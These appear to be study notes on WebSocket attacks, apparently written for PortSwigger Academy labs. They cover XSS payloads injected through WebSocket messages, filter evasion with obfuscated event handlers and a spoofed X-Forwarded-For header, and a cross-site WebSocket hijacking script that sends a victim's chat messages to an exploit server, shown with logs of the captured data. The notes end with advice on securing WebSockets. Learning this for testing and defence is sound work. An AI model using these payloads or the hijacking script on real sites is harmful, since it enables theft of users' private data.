# Websocket

* Intercept & modify WebSocket
* Replay & Generate new websocket messages
* Manipulate Websocket connections

## Manipulating and modifying web socket

* Proxy to intercept websocket messages
* Repeater send to repeater
* Edit and send web socket messages
* When you click "connect", Burp will attempt to carry out the configured handshake and display the result.

## Web socket vulnerabilties

* User supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilties such as SQL injection or XML external entity injection.
* Some blind vulnerabilties reached via WebSockets might only be detectable using out-of-band (OAST) techniques
* Attacker-controlled data is transmitted via WebSockets to other application uses. Might lead to XSS or other client-side vulnerabilties

## Manipulating WebSocket Messages Vulnerability

Input: {"Message":"Hello Carlos"}
Output:

```
<td>Hello Carlos</td>

```

Can change input:

```
{"Message":"<img src=1 onerror='alert(1)'>"}

```

Output:

```
<td><img src=1 onerror='alert(1)'></td>

```

## How to perform attack

Proxy -> Websocket history
Message sent to server gets sent to repeater
Modify the contents and send to server and see what happens

```
"message":"<img src=1 onerror='alert(1);'>"

```

## Mainpulating websocket handshake

Misplaced HTTP headers x-forwarded-for header
attack surface introduced by custom HTTP headers

## how to perform

* obfuscate data: oNeRrOr=alert`1`

Add X-Forwarded-For: ip to trick web socket to continue even though ip got blacklisted

## Cross site websockets

Cross Site webSocket hijacking involves a Cross Site Request Forgery (CSRF)

* Perform unauthorized actions masquerading as the victim user. As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
* Retrieve sensitive data that the user can access. Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

## How to perform

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

## Example of vulnerable csrf token

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

```

Session transmitted by single cookie

## How to perform csrf

```
<script>
    var ws = new WebSocket('wss://0a95006c04c880c180fc763e009e00c7.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://exploit-0a000011045c801f807d75ef01cd00cf.exploit-server.net/log?' + event.data, {method:'GET'});
    };
</script>

```

```
10.0.4.128      2025-05-28 02:36:15 +0000 "GET /log?{%22user%22:%22You%22,%22content%22:%22I%20forgot%20my%20password%22} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
10.0.4.128      2025-05-28 02:36:15 +0000 "GET /log?{%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&apos;s%20wy3yu4q2voqav42ylmec%22} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

```

## Secure websockets

* Use the wss:// protocol (WebSockets over TLS). Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
* Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
* Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.